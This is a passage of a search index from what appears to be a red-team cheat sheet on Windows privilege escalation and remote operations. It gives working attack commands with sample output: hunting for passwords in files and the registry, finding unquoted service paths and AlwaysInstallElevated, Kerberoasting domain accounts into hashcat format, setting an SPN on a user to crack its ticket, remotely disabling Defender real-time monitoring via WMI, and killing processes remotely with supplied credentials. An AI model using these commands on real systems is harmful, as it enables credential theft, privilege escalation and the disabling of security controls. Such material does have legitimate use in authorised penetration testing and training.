AM AcpiDev ACPI Devices driver Kernel 12/7/1993 6:22:19 AM acpiex Microsoft ACPIEx Drive Kernel 3/1/2087 8:53:50 AM acpipagr ACPI Processor Aggrega Kernel 1/24/2081 8:36:36 AM AcpiPmi ACPI Power Meter Drive Kernel 11/19/2006 9:20:15 PM acpitime ACPI Wake Alarm Driver Kernel 2/9/1974 7:10:30 AM ADP80XX ADP80XX Kernel 4/9/2015 4:49:48 PM <SNIP>","title":"Evaluating Vulnerable Drivers"},{"location":"windows/priv_esc/#evaluating-kbspatches","text":"Look for KB / Patches installed or not: wmic qfe get Caption,Description,HotFixID,InstalledOn C:\\Users\\KILLSWITCH-GUI>wmic qfe get Caption,Description,HotFixID,InstalledOn Caption Description HotFixID InstalledOn http://support.microsoft.com/?kbid=4022405 Update KB4022405 6/8/2017 http://support.microsoft.com/?kbid=4022730 Security Update KB4022730 6/8/2017 http://support.microsoft.com/?kbid=4025376 Security Update KB4025376 7/12/2017 http://support.microsoft.com/?kbid=4025342 Security Update KB4025342 7/15/2017 <SNIP> wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:\"KB..\" /C:\"KB..\" C:\\Users\\KILLSWITCH-GUI> wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:\"KB..\" /C:\"KB4022405\" http://support.microsoft.com/?kbid=4022405 Update KB4022405 6/8/2017","title":"Evaluating KBs/Patches"},{"location":"windows/priv_esc/#locating-unattended-configs","text":"Look for unattended configs in the following dirs: c:\\sysprep.inf c:\\sysprep\\sysprep.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml","title":"Locating Unattended configs"},{"location":"windows/priv_esc/#locating-alwaysinstallelevated","text":"key set to DWORD 1: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated C:\\Users\\KILLSWITCH-GUI>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated ERROR: The system was unable to find the specified registry key or value.","title":"Locating AlwaysInstallElevated"},{"location":"windows/priv_esc/#locating-sensitive-files","text":"Search the file system for file names containing certain keywords via cmd: dir /s *pass* == *cred* == *vnc* == *.config* C:\\Users\\KILLSWITCH-GUI>dir /s *pass* == *cred* == *vnc* == *.config* Volume in drive C has no label. Volume Serial Number is DA67-AFD2 Directory of C:\\Users\\KILLSWITCH-GUI\\AppData\\Local 06/28/2017 09:04 AM <DIR> password-app 0 File(s) 0 bytes","title":"Locating Sensitive Files"},{"location":"windows/priv_esc/#locating-sensitive-data-in-files","text":"Search certain file types for a keyword via cmd: findstr /si password *.xml *.ini *.txt C:\\Users\\KILLSWITCH-GUI>findstr /si password *.xml *.ini *.txt .PyCharmCE2017.1\\config\\options\\ide.general.xml: <entry key=\"ide.ssh.one.time.password\" value=\"true\" /> AppData\\Local\\lxss\\rootfs\\usr\\share\\dbus-1\\interfaces\\org.freedesktop.Accounts.User.xml: <method name=\"SetPasswordMode\">","title":"Locating Sensitive Data In Files"},{"location":"windows/priv_esc/#locating-passwords-within-thhe-registry","text":"reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s C:\\Users\\KILLSWITCH-GUI>reg query HKLM /f password /t REG_SZ /s HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{0fafd998-c8e8-42a1-86d7-7c10c664a415} (Default) REG_SZ Picture Password Enrollment UX HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a} (Default) REG_SZ PicturePasswordLogonProvider","title":"Locating Passwords Within Thhe Registry"},{"location":"windows/priv_esc/#locating-unquoted-service-paths","text":"wmic service get name,startmode,pathname | findstr /i /v \":\\windows\\\" | findstr /v \"\"\" C:\\Users\\KILLSWITCH-GUI>wmic service get name,startmode,pathname | findstr /i /v \":\\windows\\\" | findstr /v \"\"\" Name PathName StartMode AJRouter C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceNetworkRestricted Manual ALG C:\\WINDOWS\\System32\\alg.exe Manual AppIDSvc C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceNetworkRestricted","title":"Locating Unquoted Service Paths"},{"location":"windows/priv_esc/#domain-privilege-escalation","text":"","title":"Domain Privilege Escalation"},{"location":"windows/priv_esc/#kerbroasting","text":"https://gist.github.com/HarmJ0y/cc1004307157e372fc5bd3f89e553059","title":"Kerbroasting"},{"location":"windows/priv_esc/#kerbroast-a-domain-and-set-for-crashing-is-hashcat-format","text":"Invoke-Kerberoast -OutputFormat Hashcat | fl","title":"Kerbroast a domain and set for crashing is hashcat format:"},{"location":"windows/priv_esc/#acl-rights-to-set-a-spn-on-user-account-and-crack-via-spn-kerb-ticket","text":"1 . Set-DomainObject -Identity 'user' -set @{ serviceprincipalname = 'blah\\blah' } 2 . Invoke-Kerberoast -Identity 'user' -OutputFormat hashcat | fl == alternative command :== Get-DomainUser -Identity 'user' | Get-DomainSPNTicket 3 . Set-DomainObject -Identity 'user' -Clear serviceprincipalname","title":"ACL rights to set a SPN on user account and crack via SPN kerb ticket:"},{"location":"windows/remote_alteration/","text":"Windows Remote Alteration \u00b6 Powershell Remote Alteration \u00b6 Disable Defender Remotely using WMI \u00b6 Invoke-WmiMethod -ComputerName 10 . 0 . 1 . 2 -Class Win32_Process -Name Create -ArgumentList \"powershell.exe -C `Set-MpPreference -DisableRealtimeMonitoring $true `\"","title":"Remote Alteration"},{"location":"windows/remote_alteration/#windows-remote-alteration","text":"","title":"Windows Remote Alteration"},{"location":"windows/remote_alteration/#powershell-remote-alteration","text":"","title":"Powershell Remote Alteration"},{"location":"windows/remote_alteration/#disable-defender-remotely-using-wmi","text":"Invoke-WmiMethod -ComputerName 10 . 0 . 1 . 2 -Class Win32_Process -Name Create -ArgumentList \"powershell.exe -C `Set-MpPreference -DisableRealtimeMonitoring $true `\"","title":"Disable Defender Remotely using WMI"},{"location":"windows/remote_sa_cmds/","text":"Windows Remote Situational Awareness Commands \u00b6 WMI Remote Situational Awareness \u00b6 Remote process listing of machine \u00b6 gwmi Win32_Process -ComputerName 43 .*.*. 5 | % { $name = $_ . ProcessName ; $ProcessOwner = ( $_ . GetOwner (). User ); $ProcID = $_ . ProcessId ; \"$name `t`t $ProcessOwner `t $ProcID\" } PowerPick Situational Awareness \u00b6 Remote process listing of machine via Powerpick WMI with $credential object \u00b6 powerpick $credential = New-Object System . Management . Automation . PSCredential ( \"DA\\some\" ,( \"TestPassword\" | ConvertTo-SecureString -AsPlainText -Force )); gwmi Win32_Process -ComputerName < name > -Credential $credential | ?{ $_ . ProcessId -match \"PID\" }. Terminate () Remote last boot time listing with PowerPick and $credential object \u00b6 powerpick $credential = New-Object System . Management . Automation . PSCredential ( \"DA\\some\" ,( \"TestPassword\" | ConvertTo-SecureString -AsPlainText -Force )); gwmi Win32_OperatingSystem -ComputerName < name > -Credential $credential | select __SERVER ,@{ label = 'LastRestart' ; expression ={ $_ . ConvertToDateTime ( $_ . LastBootUpTime }}","title":"Remote Situational Awareness"},{"location":"windows/remote_sa_cmds/#windows-remote-situational-awareness-commands","text":"","title":"Windows Remote Situational Awareness Commands"},{"location":"windows/remote_sa_cmds/#wmi-remote-situational-awareness","text":"","title":"WMI Remote Situational Awareness"},{"location":"windows/remote_sa_cmds/#remote-process-listing-of-machine","text":"gwmi Win32_Process -ComputerName 43 .*.*. 5 | % { $name = $_ . ProcessName ; $ProcessOwner = ( $_ . GetOwner (). User ); $ProcID = $_ . ProcessId ; \"$name `t`t $ProcessOwner `t $ProcID\" }","title":"Remote process listing of machine"},{"location":"windows/remote_sa_cmds/#powerpick-situational-awareness","text":"","title":"PowerPick Situational Awareness"},{"location":"windows/remote_sa_cmds/#remote-process-listing-of-machine-via-powerpick-wmi-with-credential-object","text":"powerpick $credential = New-Object System . Management . Automation . PSCredential ( \"DA\\some\" ,( \"TestPassword\" | ConvertTo-SecureString -AsPlainText -Force )); gwmi Win32_Process -ComputerName < name > -Credential $credential | ?{ $_ . ProcessId -match \"PID\" }. Terminate ()","title":"Remote process listing of machine via Powerpick WMI with $credential object"},{"location":"windows/remote_sa_cmds/#remote-last-boot-time-listing-with-powerpick-and-credential-object","text":"powerpick $credential = New-Object System . Management . Automation . PSCredential ( \"DA\\some\" ,( \"TestPassword\" | ConvertTo-SecureString -AsPlainText -Force )); gwmi Win32_OperatingSystem -ComputerName < name > -Credential $credential | select __SERVER ,@{ label = 'LastRestart' ; expression ={ $_ . ConvertToDateTime ( $_ . LastBootUpTime }}","title":"Remote last boot time listing with PowerPick and $credential object"}]}